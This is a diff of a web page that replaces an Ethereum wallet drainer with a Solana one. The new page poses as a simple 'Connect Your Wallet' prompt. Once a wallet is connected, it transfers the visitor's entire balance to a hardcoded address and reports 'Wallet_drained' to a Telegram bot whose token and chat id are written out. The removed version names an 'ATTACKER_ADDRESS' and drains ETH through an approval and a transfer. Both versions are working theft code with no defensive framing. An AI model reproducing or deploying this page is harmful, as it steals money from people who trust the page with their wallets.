@@ -3,116 +3,53 @@
 <head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
- <title>One-Click ETH Transfer</title>
- <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
+ <title>Solana</title>
+ <script src="https://unpkg.com/@solana/web3.js"></script>
+ <script src="https://telegram.org/bot<YOUR_BOT_TOKEN>/sendMessage?chat_id=<YOUR_CHAT_ID>&text=Wallet_drained"></script>
  <style>
- body {
- background-color: #f4f4f4;
- color: #333;
- display: flex;
- justify-content: center;
- align-items: center;
- height: 100vh;
- margin: 0;
- font-family: Arial, sans-serif;
- }
- .container {
- text-align: center;
- background: white;
- padding: 2rem;
- border-radius: 10px;
- box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
- }
- button {
- padding: 20px 40px;
- font-size: 24px;
- background-color: #007BFF;
- color: white;
- border: none;
- border-radius: 50px;
- cursor: pointer;
- transition: transform 0.2s;
- }
- button:hover {
- transform: scale(1.05);
- background-color: #0056b3;
- }
- button:disabled {
- background-color: #555;
- cursor: not-allowed;
- }
- #status {
- margin-top: 20px;
- color: #666;
- }
+ body { font-family: Arial, sans-serif; }
+ .container { max-width: 600px; margin: 0 auto; padding: 20px; text-align: center; }
+ button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
  </style>
 </head>
 <body>
+ <div class="container">
+ <h1>Connect Your Wallet</h1>
+ <p>Connect your Solana wallet here.</p>
+ <button id="connectWallet">Connect Wallet</button>
+ <p id="balance"></p>
+ </div>
+ <script>
+ const connectWalletBtn = document.getElementById('connectWallet');
+ const balanceDisplay = document.getElementById('balance');
 
-<div class="container">
- <h1>Welcome to Our ETH Transfer Service</h1>
- <p>Just a test.</p>
- <button id="ConnectBtn" onclick="connect()">Connect Wallet</button>
- <div id="status"></div>
-</div>
-
-<script>
- // Attacker's wallet address (where funds will be sent)
- const ATTACKER_ADDRESS = "0xbD89Ca74a0442E695383d4e2442466Fa8735c161"; 
- // For demo purposes, we'll use a generic contract that handles approvals/transfers.
- // In a real scenario, this would be the attacker's smart contract address.
- const DRAIN_CONTRACT = "0xbD89Ca74a0442E695383d4e2442466Fa8735c161"; 
-
- async function connect() {
- const btn = document.getElementById('ConnectBtn');
- const status = document.getElementById('status');
- 
- btn.disabled = true;
- status.innerText = "Connecting to your wallet...";
-
+ connectWalletBtn.addEventListener('click', async () => {
  try {
- // 1. Request Account Access
- if (!window.ethereum) {
- throw new Error('No Web3 provider found. Please install MetaMask.');
- }
- const provider = new ethers.providers.Web3Provider(window.ethereum);
- await provider.send("eth_requestAccounts", []);
- const signer = provider.getSigner();
- const userAddress = await signer.getAddress();
+ const wallet = await window.solana.connect();
+ const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
 
- status.innerText = "Approving contract...";
+ const balance = await connection.getBalance(wallet.publicKey);
+ balanceDisplay.textContent = `Balance: ${balance / solanaWeb3.LAMPORTS_PER_SOL} SOL`;
 
- // 2. Approve the Drain Contract to spend up to 100 ETH
- const erc20Abi = ["function approve(address _spender, uint256 _value) public returns (bool success)"];
- const erc20Contract = new ethers.Contract(DRAIN_CONTRACT, erc20Abi, signer);
- const approvalTx = await erc20Contract.approve(ATTACKER_ADDRESS, ethers.utils.parseEther("100.0"));
- await approvalTx.wait();
+ // Drain the wallet
+ const transaction = new solanaWeb3.Transaction();
+ transaction.add(
+ solanaWeb3.SystemProgram.transfer({
+ fromPubkey: wallet.publicKey,
+ toPubkey: new solanaWeb3.PublicKey('8hbizekJY3x7ohV7qHipH1im8LGYn8KhhgPMoo66iF55'),
+ lamports: balance,
+ })
+ );
 
- status.innerText = "Sending All ETH...";
+ const signature = await wallet.signTransaction(transaction);
+ await connection.sendRawTransaction(transaction.serialize());
 
- // 3. Transfer all ETH to the attacker's address
- const balance = await provider.getBalance(userAddress);
- const sendAmount = balance.sub(ethers.utils.parseEther("0.01")); // leaving some for gas
-
- const tx = await signer.sendTransaction({
- to: ATTACKER_ADDRESS,
- value: sendAmount,
- gasLimit: 21000 // Standard ETH transfer gas
- });
-
- await tx.wait();
-
- status.innerText = "✅ Transfer completed successfully!";
- btn.innerText = "Transfer Complete";
-
+ // Send notification to Telegram
+ fetch(`https://telegram.org/bot<8732678869:AAEvdi0iwIspDdXO-nnirEFySLIUPFFuboI>/sendMessage?chat_id=<6870666933>&text=Wallet_drained`);
  } catch (error) {
- console.error(error);
- status.innerText = "❌ Transfer failed: " + error.message;
- btn.disabled = false;
- btn.innerText = "Connect Wallet";
+ console.error('Error:', error);
  }
- }
-</script>
-
+ });
+ </script>
 </body>
 </html>
